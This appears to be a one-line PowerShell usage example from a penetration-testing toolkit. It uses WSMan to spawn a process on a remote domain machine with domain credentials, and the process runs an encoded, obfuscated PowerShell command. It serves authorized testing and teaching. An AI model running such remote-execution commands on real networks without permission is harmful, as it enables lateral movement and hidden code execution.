# Example by Nikhil Mittal : http://www.labofapenetrationtester.com/
# Use Invoke-Encode from Nishang to encode a command or script.
Invoke-WSManAction -Action Create -ResourceURI wmicimv2/win32_process -ValueSet @{commandline="powershell.exe -e S08t0Q0oyk9OLS7m5QIA"} -ComputerName domainpc –Credential bharat\domainuser
